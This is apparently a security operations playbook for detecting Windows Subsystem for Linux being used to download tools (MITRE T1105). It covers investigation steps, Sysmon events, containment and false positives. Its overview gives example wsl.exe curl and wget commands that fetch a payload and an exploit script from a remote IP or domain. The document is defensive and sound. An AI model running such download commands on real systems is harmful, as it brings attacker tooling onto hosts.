
# T1105 - Ingress Tool Transfer · LOLBin: WSL.exe (Windows Subsystem for Linux)
**Rules Covered:**  
- CNC-E-2726320-401 - WSL Raw-IP Download or URL via Command Line (Process Creation)  
**Last updated:** 2025-10-10

> `WSL.exe` provides an environment for running Linux distributions on Windows, making it a common target for adversaries to use legitimate tools for 
> **Ingress Tool Transfer** (T1105). When WSL is invoked with remote IPs or URLs on the command line, it may fetch and execute files directly from external sources, 
> bypassing traditional defenses.

---


## Playbook - WSL Raw-IP Download or URL via Command Line

### Overview
Investigate **process creation** where `WSL.exe` is invoked with **raw IPs** or **URLs** in the command line. This indicates the use of WSL for **downloading remote content**.
Examples:
- `wsl.exe curl http://192.168.1.100/payload -o /tmp/payload`
- `wsl.exe wget https://example.com/exploit.sh -O /home/user/exploit.sh`

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688** for `WSL.exe` with full `CommandLine`, `ParentImage`, `User`, and timestamp.  
2. **Parse source:** Identify **URL**, **IP address**, and **protocol** used in the command line; flag **raw IPs** and **suspicious domains**.  
3. **Secure artifacts:** Snapshot **/tmp**, **/home/user**, or other directories for files downloaded within ±10 minutes of process creation.

### Investigation Steps
#### 1) Process & Lineage
- Validate `Image` path/signature (`C:\\Windows\\System32\\wsl.exe`).  
- Review **parent process** (e.g., PowerShell, cmd, MSBuild, RMM tools, etc.) and determine if the execution context is legitimate.  
- Look for **user context** (elevated or script initiated).

#### 2) Command‑Line Analysis
- Confirm the presence of **remote URLs** or **IP addresses** and confirm they are intended for remote file download.  
- Review other command switches and evaluate if **wget** or **curl** are used in a suspicious manner.

#### 3) Network & DNS
- Correlate **Sysmon EID 3** for network connections originating from `WSL.exe` or **helper processes** (`curl`, `wget`).  
- Use **Sysmon EID 22** for DNS queries related to the **remote domains/IPs**.

#### 4) Artifact & Execution
- Review **Sysmon EID 11** for new files created in **/tmp**, **/home/user**, or other directories.  
- Look for **follow‑on processes** spawned by downloaded files (e.g., `bash`, `sh`, `python`, etc.).

### Key Artifacts
- **Sysmon EID 1 / 4688:** Full process creation and command line context.  
- **Sysmon EID 3:** Network connections to the remote source.  
- **Sysmon EID 22:** DNS queries for external domains/IPs.  
- **Sysmon EID 11:** File creation and modification in **/tmp**, **/home/user**, or other directories.

### Containment Actions
- **Block** destinations/IPs; **quarantine** files; **terminate** related processes.  
- Consider **host isolation** if execution occurred from a suspicious source.

### Prevention Measures
- **AppLocker/WDAC** to restrict `wsl.exe` execution.  
- Disable `wget` or `curl` in WSL environments if not required.
- Enforce **egress filtering** for **non‑approved external communications**.

### Recovery
- Remove any malicious artifacts; reset **/tmp** and **/home** directories, and restore any impacted files from backups.

### False Positives
- Legitimate usage of WSL for **internal automation** that uses **trusted internal URLs/IPs** for fetching resources.
